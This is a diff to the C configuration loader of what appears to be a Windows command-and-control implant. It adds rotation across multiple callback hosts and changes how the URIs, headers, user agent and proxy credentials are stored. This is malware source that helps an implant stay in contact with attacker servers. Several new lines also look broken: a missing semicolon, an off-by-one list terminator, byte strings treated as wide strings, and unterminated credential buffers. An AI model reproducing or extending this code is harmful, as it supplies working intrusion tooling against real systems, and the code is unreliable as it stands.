@@ -5,7 +5,7 @@
 #include <Core/Parser.h>
 #include <Core/MiniStd.h>
 
-BYTE AgentConfig[ CONFIG_SIZE ]  = CONFIG_BYTES;
+BYTE AgentConfig[ CONFIG_SIZE ] = CONFIG_BYTES;
 
 // TODO: Clear memory at exit
 VOID ConfigInit()
@@ -60,12 +60,23 @@ VOID ConfigInit()
     )
 
 #ifdef TRANSPORT_HTTP
-    Instance->Config.Transport.Method = L"POST";
+    Instance->Config.Transport.Method       = L"POST";
+    Instance->Config.Transport.HostRotation = ParserGetInt32( &Parser );
 
-    Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.Host = Instance->Win32.LocalAlloc( LPTR, ( Length * 2 ) + 2 );
-    Length = CharStringToWCharString( Instance->Config.Transport.Host, Buffer, Length );
-    PRINTF( "[CONFIG] Host: %ls [%d]\n", Instance->Config.Transport.Host, Length );
+    J = ParserGetInt32( &Parser );
+    Instance->Config.Transport.Hosts = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    PRINTF( "[CONFIG] Hosts [%d]:\n", J );
+    for ( INT i = 0; i < J; i++ )
+    {
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Instance->Config.Transport.Hosts[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) )
+        MemCopy( Instance->Config.Transport.Hosts[ i ], Buffer, Length );
+#ifdef DEBUG
+        printf( "  - %ls\n", Instance->Config.Transport.Hosts[ i ] );
+#endif
+    }
+    Instance->Config.Transport.Hosts[ J + 1 ] = NULL;
+    Instance->Config.Transport.HostIndex      = 0;
 
     // Listener Port
     Instance->Config.Transport.Port = ParserGetInt32( &Parser );
@@ -77,19 +88,20 @@ VOID ConfigInit()
 
     // UserAgent
     Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.UserAgent = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
-    CharStringToWCharString( Instance->Config.Transport.UserAgent, Buffer, Length );
+    Instance->Config.Transport.UserAgent = NtHeapAlloc( Length + sizeof( WCHAR ) );
+    MemCopy( Instance->Config.Transport.UserAgent, Buffer, Length );
     PRINTF( "[CONFIG] UserAgent: %ls\n", Instance->Config.Transport.UserAgent );
 
     // Headers
     J = ParserGetInt32( &Parser );
-    Instance->Config.Transport.Headers = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    Instance->Config.Transport.Headers = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
     PRINTF( "[CONFIG] Headers [%d]:\n", J );
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Headers[ i ] = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
-        CharStringToWCharString( Instance->Config.Transport.Headers[ i ], Buffer, Length );
+        Instance->Config.Transport.Headers[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
+        MemSet( Instance->Config.Transport.Headers[ i ], 0, Length );
+        MemCopy( Instance->Config.Transport.Headers[ i ], Buffer, Length );
 #ifdef DEBUG
         printf( "  - %ls\n", Instance->Config.Transport.Headers[ i ] );
 #endif
@@ -98,13 +110,14 @@ VOID ConfigInit()
 
     // Uris
     J = ParserGetInt32( &Parser );
-    Instance->Config.Transport.Uris = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    Instance->Config.Transport.Uris = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
     PRINTF( "[CONFIG] Uris [%d]:\n", J );
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Uris[ i ] = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
-        CharStringToWCharString( Instance->Config.Transport.Uris[ i ], Buffer, Length );
+        Instance->Config.Transport.Uris[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
+        MemSet( Instance->Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.Uris[ i ], Buffer, Length );
 #ifdef DEBUG
         printf( "  - %ls\n", Instance->Config.Transport.Uris[ i ] );
 #endif
@@ -117,15 +130,15 @@ VOID ConfigInit()
     {
         PUTS( "[CONFIG] [PROXY] Enabled" );
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Proxy.Url = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
-        CharStringToWCharString( Instance->Config.Transport.Proxy.Url, Buffer, Length );
+        Instance->Config.Transport.Proxy.Url = NtHeapAlloc( Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
         PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance->Config.Transport.Proxy.Url );
 
         Buffer = ParserGetBytes( &Parser, &Length );
         if ( Length > 0 )
         {
-            Instance->Config.Transport.Proxy.Username = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
-            CharStringToWCharString( Instance->Config.Transport.Proxy.Username, Buffer, Length );
+            Instance->Config.Transport.Proxy.Username = NtHeapAlloc( Length );
+            MemCopy( Instance->Config.Transport.Proxy.Username, Buffer, Length );
             PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance->Config.Transport.Proxy.Username );
         }
         else
@@ -134,8 +147,8 @@ VOID ConfigInit()
         Buffer = ParserGetBytes( &Parser, &Length );
         if ( Length > 0 )
         {
-            Instance->Config.Transport.Proxy.Password = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
-            CharStringToWCharString( Instance->Config.Transport.Proxy.Password, Buffer, Length );
+            Instance->Config.Transport.Proxy.Password = NtHeapAlloc( Length );
+            MemCopy( Instance->Config.Transport.Proxy.Password, Buffer, Length );
             PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance->Config.Transport.Proxy.Password );
         }
         else
